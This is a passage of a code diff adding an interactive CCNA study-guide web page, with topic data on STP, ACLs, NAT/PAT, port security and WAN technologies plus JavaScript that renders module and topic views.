+{title:"Spanning Tree Protocol (STP)",body:"<ul><li>Prevents Layer 2 loops causing broadcast storms</li><li>Elects root bridge — lowest Bridge ID (priority + MAC)</li><li>Redundant ports blocked to eliminate loops</li><li>Port states: Blocking → Listening → Learning → Forwarding (~30s)</li><li><strong>RSTP (802.1w)</strong> — rapid STP, converges in seconds</li><li><strong>BPDU Guard</strong> — shuts port if BPDU received on portfast port</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#0F6E56",hours:"3 hrs",task:"VLANs and trunking",detail:"Configure VLANs on 2-switch topology. Set up trunk. Verify with show vlan brief and show interfaces trunk."},
+{week:"Week 2",color:"#1D9E75",hours:"4 hrs",task:"STP",detail:"Build redundant topology. Observe STP blocking. Change priorities to control root bridge election."},
+{week:"Week 3",color:"#5DCAA5",hours:"3 hrs",task:"Inter-VLAN routing",detail:"Configure router-on-a-stick or L3 switch SVIs. Verify hosts in different VLANs can communicate."}],
+practice:["Configure 3 VLANs and assign ports — verify with show vlan brief","Set up 802.1Q trunk between two switches — allow only specific VLANs","Identify root bridge given bridge priorities and MAC addresses","Explain why BPDU Guard is important on end-device switch ports"],
+resources:[{name:"Jeremy's IT Lab — VLANs and STP",desc:"Free CCNA YouTube series"},{name:"Cisco VLAN guide",desc:"Official documentation"},{name:"Packet Tracer labs — NetAcad",desc:"Practice until show commands are second nature"}]},
+
+{name:"ACLs & security",sub:"Standard vs extended ACLs, wildcard masks, NAT/PAT, port security",
+overview:"ACLs filter traffic on routers. NAT/PAT translate addresses. Port security limits device access. All three are assessed in Packet Tracer labs and theory exams.",
+concepts:[
+{title:"Standard ACLs",body:"Filter on source IP only:<ul><li>Range: 1-99 and 1300-1999</li><li><code>access-list 10 permit 192.168.1.0 0.0.0.255</code></li><li>Wildcard mask: inverse of subnet mask (0.0.0.255 = match any host in /24)</li><li>Apply near <strong>destination</strong> (can only match source)</li><li>Implicit deny all at end; rules processed top-down</li></ul>"},
+{title:"Extended ACLs",body:"Filter on source IP, dest IP, protocol and port:<ul><li>Range: 100-199 and 2000-2699</li><li><code>access-list 100 permit tcp 192.168.1.0 0.0.0.255 any eq 80</code></li><li>Keywords: eq, gt, lt, range</li><li>Place near <strong>source</strong> (filter early to reduce traffic)</li></ul>"},
+{title:"NAT and PAT",body:"<ul><li><strong>Static NAT</strong> — one-to-one private:public mapping</li><li><strong>PAT</strong> — many private IPs share one public IP via port numbers (home routers)</li><li>Config PAT: <code>ip nat inside source list 1 interface fa0/0 overload</code></li><li>Verify: <code>show ip nat translations</code></li></ul>"},
+{title:"Port security",body:"<ul><li><code>switchport port-security maximum 1</code></li><li><code>switchport port-security mac-address sticky</code> — learn and lock MAC</li><li>Violation: Shutdown (err-disabled), Restrict (drop+log), Protect (drop silently)</li><li>Recover: <code>shutdown</code> then <code>no shutdown</code></li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#0F6E56",hours:"3 hrs",task:"ACL configuration",detail:"Configure standard and extended ACLs in Packet Tracer. Verify with ping tests."},
+{week:"Week 2",color:"#1D9E75",hours:"3 hrs",task:"NAT and PAT",detail:"Configure PAT. Verify with show ip nat translations after a ping."},
+{week:"Week 3",color:"#5DCAA5",hours:"3 hrs",task:"Port security",detail:"Configure sticky MAC port security. Trigger violation. Recover the err-disabled port."}],
+practice:["Write extended ACL permitting HTTP/HTTPS from 10.0.0.0/8, denying Telnet from anywhere","Configure PAT — verify translations after ping","Set up sticky MAC port security — trigger and recover from a violation","Standard vs extended ACL placement — where and why?"],
+resources:[{name:"Cisco ACL guide",desc:"Official documentation"},{name:"Packet Tracer ACL/NAT labs",desc:"NetAcad practice scenarios"},{name:"Jeremy's IT Lab — ACLs and NAT",desc:"Free CCNA YouTube series"}]},
+
+{name:"WAN technologies",sub:"Serial links, PPP/HDLC, VPN types, IPsec, GRE tunnels",
+overview:"WAN technologies connect geographically separated sites. PPP, VPN types and GRE tunnels are assessed in both Packet Tracer labs and theory exams.",
+concepts:[
+{title:"Serial links and HDLC",body:"<ul><li>Point-to-point WAN links use DCE/DTE cable pairs — DCE provides clock</li><li>HDLC — Cisco default serial encapsulation (Cisco proprietary)</li><li>Config: <code>interface serial0/0; encapsulation hdlc; clock rate 64000</code> (on DCE)</li><li>Both sides must match or link stays down</li></ul>"},
+{title:"PPP with authentication",body:"<ul><li>Open standard serial encapsulation</li><li><strong>PAP</strong> — sends credentials in plain text (weak)</li><li><strong>CHAP</strong> — challenge-handshake, MD5 hash (never sends password)</li><li>Config: <code>encapsulation ppp; ppp authentication chap</code></li></ul>"},
+{title:"VPN types",body:"<ul><li><strong>Site-to-site</strong> — connects offices permanently via IPsec. Transparent to users</li><li><strong>Remote access</strong> — individual users via client software (AnyConnect, OpenVPN)</li><li><strong>IPsec</strong>: AH (integrity only) + ESP (encryption + integrity) + IKE (key exchange)</li><li><strong>SSL/TLS VPN</strong> — uses HTTPS (443), works through most firewalls</li></ul>"},
+{title:"GRE tunnels",body:"<ul><li>Creates logical tunnels for routing protocols across WAN links</li><li>Config: <code>interface tunnel0; tunnel source fa0/0; tunnel destination 203.0.113.2</code></li><li>No encryption alone — combine with IPsec for security</li><li>Adds 24 bytes overhead — account for MTU to avoid fragmentation</li><li>Use case: run OSPF across internet links</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#0F6E56",hours:"2 hrs",task:"Serial links and PPP",detail:"Configure HDLC and PPP in Packet Tracer. Add CHAP authentication. Verify link."},
+{week:"Week 2",color:"#1D9E75",hours:"3 hrs",task:"VPN concepts",detail:"Study IPsec: AH vs ESP, IKE phases. Draw site-to-site VPN establishment sequence."},
+{week:"Week 3",color:"#5DCAA5",hours:"2 hrs",task:"GRE tunnels",detail:"Configure GRE in Packet Tracer. Run OSPF over the tunnel to exchange routes."}],
+practice:["Configure PPP with CHAP on serial link — verify link comes up","Explain AH vs ESP in IPsec — when would you use each?","Difference between site-to-site and remote access VPN?","Configure GRE tunnel and verify connectivity — why run OSPF over a GRE tunnel?"],
+resources:[{name:"Cisco PPP configuration guide",desc:"Official PPP/HDLC reference"},{name:"IPsec VPN overview — Cisco",desc:"Site-to-site IPsec concepts and config"},{name:"Jeremy's IT Lab — WAN technologies",desc:"Free CCNA series"}]}
+]}
+];
+
+const nav=document.getElementById("nav"),content=document.getElementById("content");
+
+function renderModule(modIdx){
+  const mod=data[modIdx];
+  document.querySelectorAll(".nav-btn").forEach((b,i)=>b.classList.toggle("active",i===modIdx));
+  const assessHTML=mod.assess.map(a=>`<div class="assess-pill"><strong>${a.l}:</strong> ${a.r}</div>`).join("");
+  const topicsHTML=mod.topics.map((t,ti)=>`
+    <div class="topic-card" onclick="renderTopic(${modIdx},${ti})">
+      <div class="topic-num">Topic ${ti+1}</div>
+      <div class="topic-name">${t.name}</div>
+      <div class="topic-sub">${t.sub}</div>
+      <div class="topic-arrow"><i class="ti ti-arrow-right"></i></div>
+    </div>`).join("");
+  content.innerHTML=`
+    <div class="mod-header-card">
+      <div class="mod-icon" style="background:${mod.bg}">
+        <i class="ti ${mod.icon}" style="color:${mod.iconColor};font-size:22px"></i>
+      </div>
+      <div>
+        <div class="mod-title">${mod.name}</div>
+        <div class="mod-meta">${mod.meta}</div>
+        <div class="mod-desc">${mod.desc}</div>
+        <div class="assess-row">${assessHTML}</div>
+      </div>
+    </div>
+    <div class="section-label">Topics — click any card to open its full page</div>
+    <div class="topics-grid">${topicsHTML}</div>`;
+}
+
+function renderTopic(modIdx,topicIdx){
+  const mod=data[modIdx],t=mod.topics[topicIdx];
+  const conceptsHTML=t.concepts.map(c=>`
+    <div class="concept">
+      <div class="concept-head" onclick="toggleConcept(this)">
+        <span class="concept-title">${c.title}</span>
+        <i class="ti ti-chevron-down" style="font-size:16px;color:var(--text3);transition:transform 0.2s"></i>
+      </div>
+      <div class="concept-body">${c.body}</div>
+    </div>`).join("");
+  const tlHTML=t.timeline.map(tl=>`
+    <div class="tl-item">
+      <div class="tl-left">
+        <div class="tl-dot" style="background:${tl.color}"></div>
+        <div class="tl-line"></div>
+      </div>
+      <div class="tl-body">
+        <div class="tl-week" style="color:${tl.color}">${tl.week}</div>
+        <div class="tl-task">${tl.task}</div>
+        <div class="tl-detail">${tl.detail}</div>
+        <span class="tl-hours" style="background:${tl.color}22;color:${tl.color}">${tl.hours}</span>
+      </div>
+    </div>`).join("");
+  const practiceHTML=t.practice.map(p=>`
+    <div class="practice-item"><i class="ti ti-pencil"></i><span>${p}</span></div>`).join("");
+  const resHTML=t.resources.map(r=>`
+    <div class="resource-item">
+      <i class="ti ti-book"></i>
+      <div><div class="resource-name">${r.name}</div><div class="resource-desc">${r.desc}</div></div>
+    </div>`).join("");
+  content.innerHTML=`
+    <button class="back-btn" onclick="renderModule(${modIdx})">
+      <i class="ti ti-arrow-left"></i> Back to ${mod.shortName}
+    </button>
+    <div class="detail-card">
+      <div class="detail-header">
+        <div class="mod-icon" style="background:${mod.bg};flex-shrink:0">
+          <i class="ti ${mod.icon}" style="color:${mod.iconColor};font-size:20px"></i>
+        </div>
+        <div>
+          <div class="breadcrumb">${mod.name}</div>
+          <div class="detail-title">${t.name}</div>
+          <div style="font-size:13px;color:var(--text3);margin-top:2px">${t.sub}</div>
+        </div>
+      </div>
+      <div class="detail-overview">${t.overview}</div>
+      <div class="section-label">Key concepts — click to expand</div>
+      <div class="concepts">${conceptsHTML}</div>
+      <div class="section-label">Study timeline</div>
+      <div class="timeline">${tlHTML}</div>
+      <div class="section-label">Practice tasks</div>
+      <div class="practice-list">${practiceHTML}</div>
+      <div class="section-label">Recommended resources</div>
+      <div class="resource-list">${resHTML}</div>
+    </div>`;
+  window.scrollTo(0,0);
+}
+
+function toggleConcept(head){
+  const body=head.nextElementSibling,icon=head.querySelector("i");
+  const isOpen=body.classList.toggle("open");
+  icon.style.transform=isOpen?"rotate(180deg)":"rotate(0deg)";
+}
+
+data.forEach((mod,i)=>{
+  const btn=document.createElement("button");
+  btn.className="nav-btn";
+  btn.textContent=mod.shortName;
+  btn.onclick=()=>renderModule(i);
+  nav.appendChild(btn);
+});
+
+renderModule(0);
+</script>
+</body>
+</html>
